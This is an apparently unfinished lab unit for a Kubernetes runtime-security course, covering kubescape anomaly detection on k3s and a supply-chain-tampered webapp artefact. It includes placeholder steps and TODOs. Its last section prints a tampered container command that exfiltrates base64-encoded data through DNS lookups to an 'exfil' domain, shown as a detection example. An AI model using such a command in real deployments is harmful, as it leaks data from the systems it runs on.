---
kind: unit

title: Consume the app on client cluster

name: consume-app-install
---

Pretending we are now the consumer/user of `webapp` , we have our own infrastructure.
This consumer uses k3s, which is another slim kubernetes flavour from a different vendor than k0s.

We, ll cover the following
 
* Get to know our k3s installation
* Deploy kubescape in a slightly different config to give us anomaly detection
* Follow the 2-step installation process
* Watch it for the two types of anomalies
  

## 0 Clone repo
Again, lets clone the same repo, this is a fresh playground
```git
git clone https://github.com/k8sstormcenter/honeycluster.git
cd honeycluster
git checkout 152-implement-bill-of-behaviour-demo-lab 
```
::simple-task
---
:tasks: tasks
:name: git_clone
---
#active
Waiting for you to clone the repo


#completed
Congrats! 
::

## 1 Install kubescape and wait until it's up and running

```sh
make kubescape-bob-kind
```
```bash
kubectl get pods -n honey -l app.kubernetes.io/instance=kubescape
```
You want the `STATUS` of all pods to be `Running`, like so:
```
laborant@dev-machine:webapp_t$ kubectl get pods -n honey -l app.kubernetes.io/instance=kubescape
NAME                                READY   STATUS    RESTARTS   AGE
grype-offline-db-579c6cbc47-rvgqk   1/1     Running   0          20m
node-agent-b4qmg                    2/2     Running   0          20m
node-agent-tgs8f                    2/2     Running   0          20m
node-agent-vslk6                    2/2     Running   0          20m
operator-559b868885-kr8dt           1/1     Running   0          20m
storage-79d6fd9785-gdpx2            1/1     Running   0          20m
```


Check out the Explorer tab :tab-locator-inline{text='Explorer' name='Explorer'}

## 2 pull down artefact

```sh
some mystical command like ctr pull
```


## 3 deploy artefact (first without tampering)

WIP: currently testing the tampered artefact deployment automation
TODO: Use FIRST the untampered one and just compare k8s and k3s

Hang on: step 1 is deploying the application profile -> add this TODO
```sh
cd traces/kubescape-verify/attacks/webapp/
chmod +x setup.sh
./setup.sh
```

Open a new tab :tab-locator-inline{text='new terminal' machine='dev-machine' :new=true}
Lets test the ping:

```sh
curl localhost:8080/ping.php?ip=172.16.0.2
```
if that works, let it loop 

```sh
while true; do curl localhost:8080/ping.php?ip=172.16.0.2; sleep 10; done
```
Do not kill the looping.
Please, switch back to the original :tab-locator-inline{text='dev-machine' name='dev-machine'} tab, and you are ✅



## 4 Wait for kubescape to settle

TODO: replace with more production like method

We ll wait until we have an application profile again and we ll throw it away

```sh
kubectl describe cm -n honey ks-cloud-config
kubectl describe RuntimeRuleAlertBinding all-rules-all-pods
```

```sh
kubectl get applicationProfile -A
kubectl get applicationProfile replicaset-webapp-75c688bfc4 -o yaml > ~/originalappprofile.yaml
```

```
laborant@dev-machine:webapp_t$ kubectl get applicationProfile -A
NAMESPACE   NAME                           CREATED AT
default     replicaset-webapp-75c688bfc4   2025-04-25T12:38:28Z
```

now edit that profile (so it keeps it name), but use the content of the one from Module 1!!!


## 5 watch how k3s is different from k8s

## 6 same game with the supply chain corruption

if you deployed the tampered one, notice

```
    - args:
      - /bin/sh
      - -c
      - nslookup NjQgYnl0ZXMgZnJvbSAxNzIuMTYuMC4yOiBpY21wX3NlcT0zIHR0bD02MyB0aW1lPTAuNDUzIG1z.exfil.k8sstormcenter.com
        > /dev/null 2>&1
      path: /bin/sh
```
